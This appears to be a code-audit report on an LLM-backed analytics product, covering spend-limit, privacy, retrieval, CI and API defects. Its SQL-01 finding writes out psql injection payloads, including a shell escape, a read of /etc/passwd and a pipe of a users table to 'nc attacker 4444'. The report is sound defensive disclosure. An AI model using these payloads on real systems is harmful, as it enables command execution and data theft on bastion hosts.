- **What is wrong**: `OpenRouterCreditService.provision` mints a per-account OpenRouter key, Fernet-encrypts it into `llm_credit.key_encrypted`, tracks two spend pockets, renews it on `subscription_cycle` and revokes it on cancellation. Nothing in the inference path ever reads it. `OpenRouterAdapter.__init__` binds `settings.openrouter_api_key` — the single shared operator key — at construction, and `LLMRouter.__init__` (`router.py:~120`) accepts only a `usage_sink`, so no call site can pass an account key even if it wanted to. `key_encrypted` is decrypted in exactly one place (`openrouter_credit_service.py:103`, inside `provision`'s idempotent early-return) and re-encrypted by the key-rotation sweep (`ops/credential_rotation.py:62`). Because the dollar ceiling was believed to be the real limit, all four tiers set `daily_token_limit: 0` / `monthly_token_limit: 0` (`plan_catalogue.py:73-74, 88-89, 106-107, 124-125`), where `0` means unlimited — and the global fallbacks `user_daily_token_limit` / `user_monthly_token_limit` also default to `0` (`config.py:1074-1075`). **There is therefore no spend limit at either layer.**
- **Concrete failure**: A customer buys Base at $199/month, sold with "$30/month of LLM credit at cost". Their account is provisioned an OpenRouter key with a $30 ceiling that no request ever presents. Every LLM call they make — including an unattended nightly repo index, which CLAUDE.md records burning 1,666,411 tokens in one run on 2026-09-06 — is billed to the operator's shared key with no ceiling, no per-account attribution at the provider, and no mechanism that can stop it mid-request.
- **Evidence**:
```python
# backend/app/llm/openrouter_adapter.py:116-117
class OpenRouterAdapter(BaseLLMProvider):
    def __init__(self):
        self._api_key = settings.openrouter_api_key   # operator key, no override

# backend/app/llm/router.py:162-166
key_map = {
    "openai": settings.openai_api_key,
    "anthropic": settings.anthropic_api_key,
    "openrouter": settings.openrouter_api_key,
}
```
```
$ grep -rn "key_encrypted" backend/app/ | grep -v models/llm_credit.py | grep -i llm
backend/app/ops/credential_rotation.py:62:    (LlmCredit, ("key_encrypted",)),
backend/app/services/openrouter_credit_service.py:103:            return decrypt(row.key_encrypted)
backend/app/services/openrouter_credit_service.py:121:        row.key_encrypted = encrypt(key)
backend/app/services/openrouter_credit_service.py:305:        row.key_encrypted = None
```
- **Severity**: **critical** — the entire commercial containment of the product's dominant variable cost is inert, and the belt (token ceilings) was deliberately loosened because the braces (dollar ceiling) were believed to hold.
- **Confidence**: certain. `grep -rn "openrouter_api_key" backend/app/` returns 6 hits, none in an agent or a per-account resolver; `LLMRouter.__init__` has no key parameter.

---

## BIZ-03 — The Privacy Policy states in a two-column table that raw database rows are NOT sent to the LLM; every answer sends them

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/privacy/page.tsx:274`, under the heading **"NOT sent to LLM"**: `Raw database rows/values`. The same table's "Sent to LLM" column lists only the question, schema metadata, conversation context and repository structural metadata.
- **Where the code differs**: `backend/app/agents/result_handler.py:57`, reached via `backend/app/agents/sql_agent.py:649` → `sql_agent.py:452-457`
- **What is wrong**: `format_query_results` renders up to `max_rows` (default 20) of the customer's actual result rows into a markdown table, and `_handle_execute_query` returns that string as the `execute_query` tool result, which is appended to the LLM message list as `role="tool"`. The source file's own comment at `result_handler.py:16-19` says so explicitly. Column sample values are additionally shipped in schema context. This is not incidental — synthesising an answer from rows is the product's core loop — so the table is not merely out of date, it describes the opposite of the architecture.
- **Concrete failure**: A prospect reads the Privacy Policy, concludes that customer PII in a `users` table can never reach OpenAI/Anthropic/OpenRouter, and connects a production database. Their first question — "who are our top 10 customers by revenue?" — sends ten rows of names, emails and amounts to a third-party LLM provider in the tool message.
- **Evidence**:
```python
# backend/app/agents/result_handler.py:16-19, 57
# AQ-2: database-sourced content is inserted into the LLM context verbatim, so
# a crafted row value ... could act as an indirect prompt injection.
    for row in results.rows[:max_rows]:
        lines.append("| " + " | ".join(str(v) for v in row) + " |")

# backend/app/agents/sql_agent.py:649, 452-457
        formatted = self._format_query_results(results)
                messages.append(
                    Message(role="tool", content=result_text,
                            tool_call_id=tc.id, name=tc.name)
                )
```
- **Severity**: **critical** — a legal document affirmatively denies the single most consequential data flow in the product, on a page that also claims every statement on it is verifiable from the source.
- **Confidence**: certain.

---

## DATA-01 — The paid tiers' token ceilings are erased at every boot; migration `c3d4e5f6a7b8` is undone by `plan_catalogue_reconcile` seconds later

*`DATA` — Data model and migrations*

- **Where**: `backend/app/services/plan_catalogue.py:73-74` and `:90-91`; `backend/app/ops/plan_catalogue_reconcile.py:63-77` (called from `backend/app/main.py:174-176`); `backend/alembic/versions/c3d4e5f6a7b8_paid_tier_token_ceilings.py:84-96`; `Procfile:1`
- **What is wrong**: Two writers own `plans.daily_token_limit` / `plans.monthly_token_limit` and they disagree. The migration sets `base` to 2 500 000 / 7 500 000 and `scale` to 7 500 000 / 22 500 000. `PAID_TIERS` — the "one home for the ladder" the reconcile carries into the database — still declares `0` for both fields on all four tiers, and `0` means *unlimited* (`app/services/usage_service.py:150`, `if not daily and not monthly: return None`). The reconcile is a blind field-by-field overwrite (`if getattr(row, field) != value: setattr(row, field, value)`), so it resets the ceiling on every start-up.
- **Concrete failure**: `Procfile` runs `alembic upgrade head && uvicorn`, so the migration writes 2 500 000 into `plans.daily_token_limit` for `base`, and the FastAPI `lifespan` then writes `0` over it before the first request is served. `EntitlementService.effective_token_limits` (`entitlement_service.py:149-151`) reads that column; `USER_DAILY_TOKEN_LIMIT` is unset in production, so `check_token_budget` returns `None` for every request. The gate the migration's own docstring calls *"what stands between a 14-day trial that has paid nothing and an unbounded provider bill"* is not armed on any account.
- **Evidence** — run against the migration-built database, then the reconcile:

```
AFTER `alembic upgrade head` (what the release phase leaves):
    ('base',  1, 199.0, 2500000,  7500000)
    ('scale', 1, 599.0, 7500000, 22500000)
reconcile -> CatalogueResult(status='reconciled', inserted=1, updated=3, retired=0)
AFTER the FastAPI lifespan reconcile (what a request actually resolves against):
    ('base',  1, 199.0, 0, 0)
    ('scale', 1, 599.0, 0, 0)
    ('team',  1, 900.0, 0, 0)
```
  Model side, `plan_catalogue.py:64-82`: `{"id": "base", … "daily_token_limit": 0, "monthly_token_limit": 0, …}`. Migration side, `c3d4e5f6a7b8:84-96`: `LIMITS = {"base": {"monthly": 7_500_000, "daily": 2_500_000, …}}` → `UPDATE plans SET monthly_token_limit = …`.
  CI is green because `tests/unit/test_plan_token_ceilings.py:25-31` loads the migration file with `importlib` and asserts against its `LIMITS` dict. It never reads `PAID_TIERS` and never touches the `plans` table, so it certifies a constant that nothing in production ever sees.
- **Severity**: critical — it removes the only spend gate on a product whose per-request cost is unbounded, and it does so silently on a schedule (every dyno restart), so no log line marks the moment.
- **Confidence**: certain. Reproduced end to end above. The only thing that would change the picture is a third writer restoring the values; `grep -rn "daily_token_limit" backend/app/` shows only `plan_catalogue.py`, `entitlement_service.py` (reader) and `billing.py` (reader).

---

## KNOW-01 — The document content-hash cache and the embedding reindex cancel each other out: a fingerprint bump drops every vector, then reuses the documents whose chunks it just deleted, so they are never re-embedded

*`KNOW` — Knowledge indexing*

- **Where**: `backend/app/knowledge/pipeline_runner.py:1133` (reuse decision) vs `:1289` (the only place prose chunks are written); `backend/app/services/embedding_reindex.py:66` (`vs.delete_collection(pid)`); `backend/app/ops/embedding_reconcile.py:89-90`.
- **What is wrong**: `queue_embedding_reindex` drops the project's whole vector collection and then enqueues `run_repo_index(force_full=True)`. Inside that run, `generate_docs` reuses any document whose `content_hash` still matches its inputs — and the reuse branch (`pipeline_runner.py:1133-1146`) calls `touch_reused` and `continue`s. It never calls `add_documents`. `add_documents` for prose chunks is reachable from exactly two lines, `:1289` and `:1371`, both inside the *generated* branch. So a reused document contributes zero vectors to the collection that was just emptied. `DOC_GEN_SCHEMA` is deliberately excluded from `embedding_fingerprint()` (`doc_cache.py:32`), which is precisely what guarantees the two events coincide: every fingerprint bump is a cache *hit*.
- **Concrete failure**: bump `GRAPH_EXTRACTION_SCHEMA` from 2 → 3 (the constant's own docstring instructs you to do this "whenever `ast_parser` or `code_graph` changes what is extracted"). At boot, `reconcile_embeddings` sees the fingerprint change, deletes all 31 392 rows of `esim-php`'s vectors, and enqueues a full rebuild. That rebuild regenerates 188 documents and reuses 575 (production's own measured split, CLAUDE.md §0c). The 575 reused documents — roughly 23 600 prose chunks, including all 384 migration documents — have no vectors afterwards and will not get any: the next nightly run is incremental, sees those files unchanged, and skips them. The C3 vector-store-health guard at `:472` cannot catch it, because `code_symbol_embed` refilled the collection with ~26 000 symbol chunks earlier in the same run, so `col_count` is far from 0.
- **Evidence**:
  ```
  pipeline_runner.py:1133   if should_reuse_document(
  pipeline_runner.py:1138       docs_reused += 1
  pipeline_runner.py:1140       reused_paths.append(edoc.file_path)
  pipeline_runner.py:1145       ...
  pipeline_runner.py:1146       continue          # <- no delete, no add_documents

  $ grep -n "add_documents" app/knowledge/pipeline_runner.py
  1289:  self._vector_store.add_documents,     # inside the generated branch
  1371:  self._vector_store.add_documents,     # inside the retry branch
  ```
  `embedding_reindex.py:66`: `vs.delete_collection(pid)`; `pgvector_store.py:295`: `DELETE FROM doc_embeddings WHERE project_id = %s`.
- **Severity**: critical — silent, total loss of dense retrieval for the majority of a project's documents, triggered by the routine deploy action the fingerprint exists to automate, with no counter, log line or health guard that fires.
- **Confidence**: certain on the code path. What would settle the blast radius on the live deployment: `SELECT count(*) FROM doc_embeddings WHERE project_id=… AND metadata->>'doc_type' <> 'code_symbol'` before and after the next fingerprint bump, against `SELECT count(*) FROM knowledge_docs WHERE project_id=…`.

---

## RET-01 — the dense leg is deleted before fusion by a distance floor set above what the embedder can produce

*`RET` — Retrieval*

- **Where**: `backend/app/knowledge/hybrid_retriever.py:257-270`, fed by `backend/app/config.py:506` (`rag_relevance_threshold: float = 0.45`) at all three production sites — `app/agents/context_loader.py:85`, `app/agents/knowledge_agent.py:72`, `app/services/knowledge_catalog_service.py:106`.
- **What is wrong**: `_run_chroma` drops every dense hit whose cosine distance exceeds `0.45` (cosine similarity < 0.55) **before** RRF sees it. `all-MiniLM-L6-v2` is a symmetric similarity model; a natural-language question against a code or documentation chunk lands at distance 0.4–0.75 even when the chunk is the correct answer. So the floor sits above the *entire* relevant band, and the "hybrid" retriever runs as BM25-only. This is structurally the same defect as `hybrid_min_score = 0.03` (a floor above the best achievable score) that CLAUDE.md records as fixed on 2026-09-02 — moved one stage upstream, where the fix did not reach.
- **Concrete failure**: 400 chunks of this repo's own `app/knowledge/*.py`, chunked by the production `chunk_document` at `max_tokens=256` and embedded by the production embedder. For "how does the BM25 snapshot get rebuilt when it is missing?" the nearest neighbour is `bm25_index.py#16` at distance **0.474** — correct, and discarded. 7 of 8 questions retain **zero** dense hits. On prose (500 chunks of the repo's `docs/*.md` + root `*.md`, the shape `KnowledgeDoc` rows actually hold), **6 of 6** retain zero; nearest-neighbour distances 0.518–0.689.
- **Evidence**:
  ```
  how does the BM25 snapshot get rebuilt ...  top1=bm25_index.py#16     d=0.474  kept<=0.45:   0/400
  how are chunks sized to the embedder window? top1=chunker.py#5        d=0.512  kept<=0.45:   0/400
  what decides whether a table is code_only..  top1=code_db_sync_..#63  d=0.508  kept<=0.45:   0/400
  top-1 distance: min 0.409 median 0.570 max 0.754   dense leg emptied: 7/8 queries
  --- prose corpus (500 md chunks) ---
  how do I deploy this to production?          top1=DEPLOYMENT.md#0     d=0.544  kept<=0.45:   0/500
  top-1 distance: min 0.518 median 0.552 max 0.689   dense leg emptied: 6/6 queries
  ```
  Every top-1 in both probes is below **0.8**, the value this threshold held before it was "tightened" (`tests/unit/test_cosine_distance_validation.py:4`) — i.e. the tightening is exactly what emptied the leg.
- **Severity**: critical — the product's semantic retrieval is off in production while three flags (`hybrid_retrieval_enabled`, `context_planner_enabled`, the ContextPack RAG section) report it as on, and the failure returns a plausible BM25-only answer rather than an error.
- **Confidence**: certain for the mechanism and the measurement. What would settle the exact production magnitude: `retrieval_degraded_total{leg="dense"}` on the running dyno, or the same probe run against `doc_embeddings` rows for `esim-php`.

---

## SQL-01 — In SSH-exec mode the query is piped to `psql`/`mysql` stdin, so a psql backslash meta-command survives `SafetyGuard` and executes an arbitrary shell command on the bastion host

*`SQL` — Connectors, SQL safety, SSH*

- **Where**: `backend/app/connectors/ssh_exec.py:142` (`cmd = f"echo {shlex.quote(query)} | {cmd}"`), template at `backend/app/connectors/exec_templates.py:52-57`, allow-list at `backend/app/core/safety.py:47-49`
- **What is wrong**: `shlex.quote` protects the *shell* layer only. The quoted text is then handed verbatim to `psql` on stdin, and `psql` processes backslash meta-commands from stdin in non-interactive mode exactly as it does interactively — `\!` runs a shell command, `\copy … TO PROGRAM` runs one too, `\i`/`\o` read and write files. `SafetyGuard`'s read-only allow-list only inspects the *first* token (`_LEADING_TOKEN`, `safety.py:53`) and its denylists are SQL keyword regexes, none of which know that `\` is a command introducer for the client the connector actually feeds. The checked text and the executed text are the same string, but the *executor* is psql-the-client, not the SQL engine the guard was written against.
- **Concrete failure**: a project **viewer** (`notes.py:97` requires only `viewer`; `notes.py:111` lets a viewer create a note with arbitrary `sql_query`) creates a note on any `ssh_exec_mode` Postgres connection in the project with

  ```sql
  SELECT 1
  \! id > /tmp/pwned
  ```

  and calls `POST /api/notes/{id}/execute`. `SafetyGuard(READ_ONLY).validate(...)` returns `is_safe=True` (measured, below). The connector then runs on the owner's bastion:

  ```
  IFS= read -r DBPASS; echo 'SELECT 1
  \! id > /tmp/pwned' | PGPASSWORD="$DBPASS" psql -h 10.0.0.5 -p 5432 -U readonly -d app -A -F $'\t' --pset footer=off
  ```

  Same payload reaches the same place through `POST /api/schedules/{id}/run`, batch `/execute`, the MCP tool `execute_raw_query` (`mcp_server/tools.py:556-569`, which *requires* `is_read_only=True` and is therefore no protection here), and the `ExplainValidator` pre-flight (`core/explain_validator.py:38`) which runs the same text prefixed with `EXPLAIN (FORMAT JSON) `.
- **Evidence** — guard verdict and the exact built command, both run against the repo:

  ```
  $ .venv/bin/python -c "from app.core.safety import *; \
      print(SafetyGuard(SafetyLevel.READ_ONLY).validate('SELECT 1\n\\\\! id','postgres').is_safe)"
  True
  ```
  ```
  # SSHExecConnector._build_command("query", "SELECT 1\n\\! id > /tmp/pwned")
  COMMAND: IFS= read -r DBPASS; echo 'SELECT 1
  \! id > /tmp/pwned' | PGPASSWORD="$DBPASS" psql -h 10.0.0.5 -p 5432 -U readonly -d app ...
  ```
  Also passing the guard: `SELECT 1 \copy users TO PROGRAM 'id'`, `SELECT 1 \o /tmp/out`, `select\n\i /etc/passwd`, `SELECT * FROM users \g | nc attacker 4444`.
- **Severity**: **critical** — remote command execution on the customer's bastion host, reachable by the lowest-privileged project role, crossing from "read a database" to "shell on the box that holds the SSH key".
- **Confidence**: certain for the code path and the guard verdict (both measured above). The psql behaviour is documented and settles in one line on any host with psql: `printf 'SELECT 1\n\\! id\n' | psql -d postgres`. The MySQL variant (`\!` / `system`) is `needs-verification` — `mysql --batch` may or may not honour client commands depending on version; the Postgres one is sufficient on its own. `clickhouse-client` has no equivalent.

---

## TEST-01 — the production release step cannot fail, and the health check that follows it verifies the *previous* release

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/.github/workflows/deploy.yml:85-89` (Release backend), `:94-98` (Release frontend), `:100-112` (Verify backend health), `:114-122` (Verify frontend health)
- **What is wrong**: The two steps that actually put the new image into production call `curl -s` with no `-f`/`--fail`, no `-w "%{http_code}"`, and no inspection of the response body. `curl` exits 0 on any HTTP status, so a 401 (rotated `HEROKU_API_KEY`), 403 (quota), 404 (renamed app) or 422 (image id Heroku will not accept) is a **passing step**. The verification that follows then queries `https://api.checkmydata.ai/api/health` and `https://checkmydata.ai` — public URLs served by whatever release is currently live — so if the release never happened, the *old* release answers 200 and the job goes green. Nothing in the job compares the running commit against `workflow_run.head_sha`, even though the sha is already available and is baked into the image as `GIT_SHA`.
- **Concrete failure**: Rotate `HEROKU_API_KEY` without updating the secret. Every push to `main` builds and pushes images, gets `{"id":"unauthorized"}` back from both PATCH calls, sleeps 30 s, sees the months-old release still returning 200, and reports "Backend is healthy… Frontend is healthy". Production silently stops receiving deploys while the deploy pipeline stays green.
- **Evidence**:
```yaml
85:          curl -s -X PATCH https://api.heroku.com/apps/${{ env.BACKEND_APP }}/formation \
...
89:            -d '{"updates":[{"type":"web","docker_image":"'"$WEB_IMAGE_ID"'"},...]}'
100:      - name: Verify backend health
104:            STATUS=$(curl -s -o /dev/null -w "%{http_code}" ${{ env.BACKEND_API_URL }}/health)
105:            if [ "$STATUS" = "200" ]; then
```
  (`Dockerfile.backend` receives `--build-arg GIT_SHA=${{ github.event.workflow_run.head_sha }}` at `deploy.yml:52`, so the value needed for a real check is already in hand and unused.)
- **Severity**: critical — this is the only gate between a merged commit and production, and it is structurally incapable of reporting a failed release.
- **Confidence**: certain. `curl` without `--fail` returning exit 0 on 4xx is documented behaviour; the absence of any sha/version assertion is visible in the full 122-line file.

---


# HIGH


## ANA-01 — A genuinely empty day is reported to the user as "the vendor truncated this period"

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/services/analytics_collect_service.py:496-497` (writer) → `backend/app/agents/analytics_agent.py:866-870`, `:1151-1159`, `:1291-1299` and `backend/app/services/connection_service.py:960`, `:1012` (readers)
- **What is wrong**: The `error` column on `analytics_imports` carries two different meanings and nothing distinguishes them. `_collect_report` stores the `AnalyticsEmpty` exception text in `error` on a row whose status is `empty`; every reader treats "status in `DONE_STATUSES` **and** `error` is set" as the truncation caveat the collector writes on an `ok` row. `empty` is in `DONE_STATUSES` (`journal.py:49`), so a quiet day satisfies the test.
- **Concrete failure**: A GA4 connection whose `events` report has no matching event on 2026-09-02 (or an `overview` day before the property existed). The vendor returned nothing, the journal is correct (`empty`), and the agent tells the model and the user: *"PARTIAL VENDOR DATA: 2026-09-02: GA4 returned no rows … — the vendor truncated this period at collect time, so the values below are based on a partial vendor response: they are real, but lower than the true total."* Nothing was truncated; the totals are complete. In parallel `collection_status` promotes the same string into `caveat`, and `ConnectionHealth.tsx:453-455` renders it amber as `Caveat: …` on a perfectly healthy connection — the exact confusion `docs/ANALYTICS_SOURCES.md:249` ("If you render a caveat as an error, a successful collection looks broken") was written to prevent, one column over.
- **Evidence** — reproduced against a real in-memory database with one `ok` and one `empty` journal row:

```
$ .venv/bin/python repro_empty.py
---- what the model is told ----
Report 'overview' from 2026-09-01 to 2026-09-02, grouped by date.
PARTIAL VENDOR DATA: 2026-09-02: GA4 returned no rows for report 'overview' on period
'2026-09-02' — the vendor truncated this period at collect time, so the values below are
based on a partial vendor response: they are real, but lower than the true total.
---- what the user is told (caveat) ----
PARTIAL DATA: report 'overview' over 2026-09-01..2026-09-02 is based on a partial vendor
response — 2026-09-02: GA4 returned no rows … Those periods ARE counted above, but the
vendor only handed over part of each …
```

The writer:
```python
# analytics_collect_service.py:490-497
except AnalyticsEmpty as exc:
    await journal.record(..., status="empty", error=str(exc) or None)
```
The reader:
```python
# analytics_agent.py:866-870
degraded = [ f"{p}: {statuses[p][1]}" for p in periods
             if statuses.get(p, ("", None))[0] in DONE_STATUSES and statuses[p][1] ]
```
- **Severity**: high — the module's stated purpose is that an answer never misstates what was measured, and this fabricates a data-quality defect on ordinary, correct data, on both the answer path and the status UI.
- **Confidence**: certain — reproduced end to end; the two code sites are unambiguous.

---

## ANA-02 — A complete, successful vendor page is discarded when it is the request that spends the last quota token, and the retries that follow cannot succeed

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/analytics/ga4/adapter.py:472` (check placed after a successful response) and `:499-502` (the raise)
- **What is wrong**: `_check_quota` runs on the parsed response *inside* the retried attempt, and raises before `return response`. GA4's `QuotaStatus.remaining` is the quota remaining **after** this request, so `remaining == 0` is precisely the state of the request that succeeded and emptied the bucket. Its rows — and, in a multi-page fetch, every page accumulated so far for that property — are thrown away. `QuotaExhaustedError` is retryable, and `retry_async` bounds every wait at `MAX_RETRY_DELAY = 60.0` (`http.py:64`) while GA4's buckets are hourly and daily, so the comment justifying the placement ("a quota window that rolls over between attempts heals the very request that hit it", `adapter.py:469-471`) describes an event the retry budget cannot reach.
- **Concrete failure**: The run that exhausts `tokens_per_day`. One valid page of rows is dropped, two further `runReport` calls are issued against an already-empty bucket, and the period is journalled `failed` (`analytics_collect_service.py:520-534`). With the default `analytics_http_attempts=3`, every remaining period in the window repeats that pattern — three doomed vendor calls each — instead of one.
- **Evidence** — a fake client returning a complete 1-row page whose `tokens_per_day` reports `consumed=10, remaining=0`:

```
$ .venv/bin/python repro_quota.py
analytics request failed (attempt 1/3): … GA4 quota tokens_per_day is exhausted (consumed=10, remaining=0); retrying in 0.00s
analytics request failed (attempt 2/3): … retrying in 0.00s
analytics request gave up after 3 attempt(s) …
RAISED QuotaExhaustedError: GA4 quota tokens_per_day is exhausted (consumed=10, remaining=0)
vendor requests made: 3 -- each one returned a complete page that was discarded
```
No test covers the discard; `tests/unit/analytics/test_ga4_adapter.py:658` (`test_quota_exhaustion_is_retried_and_can_recover`) fabricates a rollover between attempts that a 60 s ceiling cannot produce against an hourly bucket.
- **Severity**: high — it converts a successful fetch into a `failed` period and spends 3× the vendor calls at exactly the moment quota is scarcest.
- **Confidence**: certain for the discard and the wasted calls. The claim that GA4's `remaining` is post-request is from Google's `QuotaStatus` contract; even if it were pre-request the discard of a complete response stands.

---

## ANA-07 — `list_reports()` counts as grounding, so an invented figure ships with no caveat, no freshness line, and no validator warning

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/agents/analytics_agent.py:439-446` (`has_grounding`), `:792` (`list_reports` increments `catalogue_reads`), `:1322-1324` (`_freshness_lines` returns `[]` with no windows), `backend/app/agents/validation.py:164-174`
- **What is wrong**: The un-grounded refusal (`:645-673`) is gated on `has_grounding`, which is true when *either* a window exists **or** `catalogue_reads > 0`. `list_reports` returns only report names, grains and period counts — no metric value whatsoever — yet it sets `catalogue_reads`. With no window, `_partial_caveats` is empty, `_freshness_lines` short-circuits to `[]`, `pending_periods` is `[]`, and `validate_analytics_result` only warns when `pending_periods` is non-empty. Every honesty gate is keyed on a window that was never opened. The module docstring's rule (`:37-43`, "No answer without a read … it is an invented measurement, and it is dropped") is satisfied in letter by a read that contains no measurements.
- **Concrete failure**: The model calls `list_reports()`, then answers *"July had roughly 12,400 sessions, up about 8% on June."* The result is `status="success"`, `caveats=[]`, `pending_periods=[]`, and the validator returns `passed=True` with zero warnings. The published answer is the sentence verbatim. The only remaining check is `AnswerQualityGate`, an LLM judge that is explicitly fail-open (`:1354-1375`) and has no data to compare the figure against.
- **Evidence** — reproduced by driving `_finalise` with exactly the state a `list_reports()` call leaves behind:
```
has_grounding: True  windows: []
status: success
pending_periods: []  caveats: ['ANSWER QUALITY (requery): validator unavailable']
--- answer shown to the user ---
July had roughly 12,400 sessions, up about 8% on June.
--- validator ---
passed: True errors: [] warnings: []
```
(the single caveat is an artefact of the stubbed router; with a working gate returning `accept` the answer ships bare.)
- **Severity**: high — it is the one failure mode the agent exists to make structurally impossible, and the structure has a door in it.
- **Confidence**: certain for the mechanism. It requires the model to state a figure after only `list_reports()`; the system prompt (`app/agents/prompts/analytics_prompt.py`) discourages it, which is precisely the "honesty guarantee that depends on the model complying with an instruction" the docstring at `:16-17` rejects.

---

## API-01 — `/api/chat/ask/stream` leaks its per-session lock when the agent limiter refuses, wedging that chat session with 409 for up to an hour

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/chat.py:677-685` (lock acquired), `backend/app/api/routes/chat.py:789-791` (429 raised outside any release path)
- **What is wrong**: The handler enters the per-session `asyncio.Lock` context manager by hand (`await _stream_lock_cm.__aenter__()`) and the matching `__aexit__` lives only inside the streaming generator's `finally`, which is created ~100 lines later. Between the two, three things can raise: `_project_svc.get`, the `agent_limiter.acquire` 429, and `update_session_status`. The author saw exactly this hazard and guarded only the first window (`chat.py:691-698`, whose comment says "otherwise the session is wedged 'busy'"); the limiter refusal, which is the most frequently taken of the three, is outside it. The non-streaming `/ask` gets this right — `chat.py:315-325` puts the acquire inside a `try` whose `finally` at `:622-632` releases both.
- **Concrete failure**: A user with three chat streams already running (`max_concurrent_agent_calls = 3`, `config.py:953`) sends `POST /api/chat/ask/stream {"project_id":"p1","session_id":"s1","message":"hi"}`. It returns `429`. Every subsequent request naming `session_id: "s1"` — from any client, any browser tab — then returns `409 {"detail":"This chat session is currently processing another request. Please wait for it to complete."}` although nothing is processing it. The lock is only released when the `TTLCache` entry expires: `_SESSION_LOCKS: TTLCache(max_size=5000, ttl=3600.0)` (`app/services/chat_service.py:21`), and `TTLCache.get` refreshes LRU position but not `expires_at` (`app/core/ttl_cache.py:56-67`), so the ceiling is 3600 s from first acquisition.
- **Evidence**:
```python
# chat.py:677-685
_stream_lock_cm = session_processing_lock(session_id)
try:
    await _stream_lock_cm.__aenter__()
except SessionBusyError as exc:
    raise HTTPException(status_code=409, ...)
# ...110 lines later, chat.py:789-791 — no try/finally around it:
limit_err = await agent_limiter.acquire(user["user_id"])
if limit_err:
    raise HTTPException(status_code=429, detail=limit_err)
```
- **Severity**: high — a routine, expected 429 permanently disables a user's chat session for an hour, and the failure is indistinguishable from the honest 409.
- **Confidence**: certain — the control flow is local to one function and both line ranges are quoted above.

---

## API-02 — Every streaming response pins its request-scoped database connection for the whole stream; `/api/workflows/events` holds one indefinitely

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/workflows.py:52-72` (`workflow_events`), `backend/app/api/deps.py:26-29` (`get_db`), `backend/app/models/base.py:52` (session factory)
- **What is wrong**: FastAPI closes yield-dependency exit stacks *after* the response has been sent — `await response(scope, receive, send)` sits inside `async with AsyncExitStack() as request_stack` (`.venv/.../fastapi/routing.py:132-137`). For a `StreamingResponse` "sent" means "the generator finished". `workflow_events` executes `get_accessible_projects` (`membership_service.py:440-445`), a bare `SELECT` with no commit, which autobegins a transaction and checks a connection out of the pool; the SSE generator then loops forever with a 30 s keepalive and no maximum duration (`workflows.py:30-44`). The route carries no rate limit, so a caller decides how many connections to hold.
- **Concrete failure**: Four browser tabs open `GET /api/workflows/events` on the same account. Four asyncpg connections leave the pool and never return. Production is configured `db_pool_size=5` + `db_pool_overflow=10` per process (`config.py:104-105`) against a Supavisor session-mode ceiling of 15 that `CLAUDE.md` already records as saturated at 14/15 at rest — so this is the difference between "no headroom" and `FATAL: (EMAXCONNSESSION) max clients reached in session mode`. `/api/chat/ask/stream` has the same shape, bounded at `stream_timeout_seconds = 360` (`config.py:919`): after `_project_svc.get` at `chat.py:707` (`project_service.py:43-49`, a `SELECT` with no commit) the session sits idle-in-transaction for the run's duration.
- **Evidence** — measured against the same session construction the app uses (`async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)`):
```
before execute checkedout: 0
after  SELECT  checkedout: 1 in_transaction: True
during 'stream' checkedout: 1
after  commit  checkedout: 0
```
- **Severity**: high — an unauthenticated-cost, unrate-limited endpoint consumes the scarcest resource in the deployment, and `/api/health` stays 200 while it saturates.
- **Confidence**: certain for the mechanism (measured above plus the FastAPI source). What would settle the production impact: open two SSE streams and read `pg_stat_activity` for rows in state `idle in transaction`.

---

## API-03 — Five `202` endpoints answer `"status": "started"` without checking whether the job was actually enqueued, and leave a run row that blocks every retry

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/repos.py:301-310`, `backend/app/api/routes/connections.py:136-146` and `:197-205`, `backend/app/api/routes/projects.py:661-667`, `backend/app/api/routes/runs.py:173-181`
- **What is wrong**: All five pass `allow_in_process=False`, which is precisely the mode in which `task_queue.enqueue` returns `None` instead of raising (`app/core/task_queue.py:127-141`). Its own docstring says *"The task was NOT started; the caller should surface a retryable failure."* Every one of the five discards the return value. Worse, each has already created an `IndexingRun` row via `RunCoordinator.start` before enqueuing, and that row occupies the partial unique index `uq_indexing_runs_active_one` (`models/indexing_run.py:85`) — so a failed enqueue is not merely a false claim, it locks the project/connection out. This is the same defect class the project fixed once in `queue_embedding_reindex` (CLAUDE.md §0d, "Three claims computed from the input instead of the outcome, in a row"); the fix never reached the HTTP layer.
- **Concrete failure**: Redis is briefly unreachable. `POST /api/repos/p1/index {"force_full": true}` → `202 {"status":"queued","run_id":"r1","workflow_id":"w1","resumed":false}`. Nothing is queued. `GET /api/runs/r1` reports `status: "queued"` and `POST /api/repos/p1/index` returns `409 {"detail":"Indexing already in progress for this project"}` for the next 300 s (`stale_running_heartbeat_timeout_seconds`) until `StaleRunReaper` flips the row. That this path fires in this deployment is already on the record: `04:30:09 ERROR app.core.task_queue: No coro_factory for in-process fallback of task run_repo_index` (CLAUDE.md, 2026-09-09).
- **Evidence**:
```python
# repos.py:300-310
if task_queue.is_arq_active():
    await task_queue.enqueue(              # returns str | None; result discarded
        "run_repo_index",
        allow_in_process=False,            # ← the branch that returns None
        ...)
    return {"status": "queued", "run_id": run.id, "workflow_id": wf_id, "resumed": resumed}
```
- **Severity**: high — the API asserts an outcome it did not observe, on the five most expensive operations in the product, and the lie costs the caller a five-minute lockout.
- **Confidence**: certain.

---

## API-04 — `POST /api/visualizations/export` with `format=xlsx` blocks the event loop for ~100 s on input the schema explicitly permits

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/visualizations.py:24-27` (declared bounds), `:45-77` (handler), `backend/app/viz/export.py:89-113` (`_append_as_text` / `export_xlsx`)
- **What is wrong**: `export_xlsx` is pure synchronous Python called directly from an `async def` handler with no `run_in_threadpool`. The F-VIZ-04 formula-injection defence added `for cell in ws[ws.max_row]` after every `ws.append` — a worksheet slice lookup per row — which turns a linear write into a superlinear one. `ExportRequest` declares `rows: list[list[Any]] = Field(max_length=50_000)` and `columns: max_length=500`, so the schema *invites* the payload that does this. Per the project's own analysis of the `graph_build` reap, any CPU-bound stretch on the loop longer than `stale_running_heartbeat_timeout_seconds` also starves the heartbeat coroutine.
